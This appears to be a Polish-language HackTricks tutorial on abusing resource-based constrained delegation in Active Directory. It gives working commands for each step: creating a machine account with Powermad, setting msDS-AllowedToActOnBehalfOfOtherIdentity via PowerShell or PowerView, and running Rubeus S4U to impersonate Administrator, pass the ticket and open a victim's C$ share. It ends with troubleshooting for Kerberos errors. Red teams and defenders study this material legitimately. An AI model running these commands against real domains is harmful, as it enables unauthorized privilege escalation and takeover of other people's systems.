# Delegacja ograniczona oparta na zasobach

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Podstawy delegacji ograniczonej opartej na zasobach

Jest to podobne do podstawowej [Delegacji Ograniczonej](constrained-delegation.md) ale **zamiast** nadawania uprawnień **obiektowi do podszycia się pod dowolnego użytkownika wobec usługi**. Delegacja ograniczona oparta na zasobach **ustawia w obiekcie, kto może podszycić się pod dowolnego użytkownika wobec niego**.

W tym przypadku obiekt z ograniczeniami będzie miał atrybut o nazwie _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ z nazwą użytkownika, który może podszycić się pod dowolnego innego użytkownika wobec niego.

Inną ważną różnicą w tej Delegacji Ograniczonej w porównaniu do innych delegacji jest to, że każdy użytkownik z **uprawnieniami do zapisu nad kontem komputera** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) może ustawić _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (w innych formach Delegacji potrzebne były uprawnienia administratora domeny).

### Nowe pojęcia

W przypadku Delegacji Ograniczonej zostało powiedziane, że flaga **`TrustedToAuthForDelegation`** wewnątrz wartości _userAccountControl_ użytkownika jest wymagana do wykonania **S4U2Self**. Ale to nie do końca prawda.\
Rzeczywistość jest taka, że nawet bez tej wartości, możesz wykonać **S4U2Self** wobec dowolnego użytkownika, jeśli jesteś **usługą** (masz SPN), ale jeśli **masz `TrustedToAuthForDelegation`** zwrócony TGS będzie **Forwardable**, a jeśli **nie masz** tej flagi, zwrócony TGS **nie** będzie **Forwardable**.

Jednak jeśli **TGS** używany w **S4U2Proxy** **NIE jest Forwardable**, próba wykorzystania **podstawowej Delegacji Ograniczonej** **nie zadziała**. Ale jeśli próbujesz wykorzystać **delegację ograniczoną opartą na zasobach, zadziała** (to nie jest podatność, to funkcja, najwyraźniej).

### Struktura ataku

> Jeśli masz **uprawnienia równoważne zapisu** nad kontem **Komputera**, możesz uzyskać **uprzywilejowany dostęp** do tego komputera.

Załóżmy, że atakujący ma już **uprawnienia równoważne zapisu nad komputerem ofiary**.

1. Atakujący **kompromituje** konto, które ma **SPN** lub **tworzy je** ("Usługa A"). Zauważ, że **dowolny** _Użytkownik Administratora_ bez żadnych innych specjalnych uprawnień może **utworzyć** aż do 10 **obiektów Komputera (**_**MachineAccountQuota**_**)** i nadać im SPN. Więc atakujący może po prostu utworzyć obiekt Komputera i nadać mu SPN.
2. Atakujący **wykorzystuje swoje uprawnienia DO ZAPISU** nad komputerem ofiary (UsługaB), aby skonfigurować **delegację ograniczoną opartą na zasobach, pozwalającą UsłudzeA na podszycie się pod dowolnego użytkownika** wobec tego komputera ofiary (UsługaB).
3. Atakujący używa narzędzia Rubeus do przeprowadzenia **pełnego ataku S4U** (S4U2Self i S4U2Proxy) z Usługi A na Usługę B dla użytkownika **z uprzywilejowanym dostępem do Usługi B**.
1. S4U2Self (z kompromitowanego/utworzonego konta SPN): Prośba o **TGS Administratora do mnie** (Nie Forwardable).
2. S4U2Proxy: Użyj **nie Forwardable TGS** z poprzedniego kroku, aby poprosić o **TGS** od **Administratora** do **komputera ofiary**.
3. Nawet jeśli używasz nie Forwardable TGS, ponieważ wykorzystujesz delegację ograniczoną opartą na zasobach, zadziała.
4. Atakujący może **przekazać bilet** i **podszycić się** pod użytkownika, aby uzyskać **dostęp do usługi ofiary B**.

Aby sprawdzić _**MachineAccountQuota**_ domeny, można użyć:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Atak

### Tworzenie obiektu komputera

Możesz utworzyć obiekt komputera wewnątrz domeny za pomocą [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurowanie ograniczonej delegacji opartej na zasobach

**Z użyciem modułu PowerShell activedirectory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Za pomocą narzędzia powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Wykonanie kompletnego ataku S4U

Po pierwsze, utworzyliśmy nowy obiekt komputera z hasłem `123456`, więc potrzebujemy hasha tego hasła:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
To wydrukuje hashe RC4 i AES dla tego konta.\
Teraz atak może zostać przeprowadzony:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Możesz generować więcej biletów, pytając tylko raz, używając parametru `/altservice` Rubeusa:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Zauważ, że użytkownicy mają atrybut o nazwie "**Nie można delegować**". Jeśli użytkownik ma ten atrybut ustawiony na True, nie będziesz w stanie się pod niego podszyć. Właściwość ta może być zobaczona w Bloodhound.
{% endhint %}

### Dostęp

Ostatnia linia poleceń przeprowadzi **pełne atak S4U i wstrzyknie TGS** od Administratora do hosta ofiary w **pamięci**.\
W tym przykładzie został żądany TGS dla usługi **CIFS** od Administratora, dzięki czemu będziesz mógł uzyskać dostęp do **C$**:
```bash
ls \\victim.domain.local\C$
```
### Nadużywanie różnych biletów usług

Dowiedz się o [**dostępnych biletach usług tutaj**](silver-ticket.md#dostępne-usługi).

## Błędy Kerberosa

* **`KDC_ERR_ETYPE_NOTSUPP`**: Oznacza to, że Kerberos jest skonfigurowany tak, aby nie używać DES ani RC4, a ty dostarczasz tylko skrót RC4. Dostarcz do Rubeusa co najmniej skrót AES256 (lub po prostu dostarcz skróty rc4, aes128 i aes256). Przykład: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Oznacza to, że czas bieżącego komputera różni się od czasu kontrolera domeny i Kerberos nie działa poprawnie.
* **`preauth_failed`**: Oznacza to, że podane nazwa użytkownika + skróty nie działają do logowania. Możliwe, że zapomniałeś wstawić "$" wewnątrz nazwy użytkownika podczas generowania skrótów (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Może to oznaczać:
* Użytkownik, którego próbujesz podrobić, nie może uzyskać dostępu do żądanej usługi (ponieważ nie możesz go podrobić lub nie ma wystarczających uprawnień)
* Żądana usługa nie istnieje (jeśli prosisz o bilet dla winrm, a winrm nie jest uruchomiony)
* Stworzony fakecomputer stracił uprawnienia do podatnego serwera i musisz je przywrócić.

## Odnośniki

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
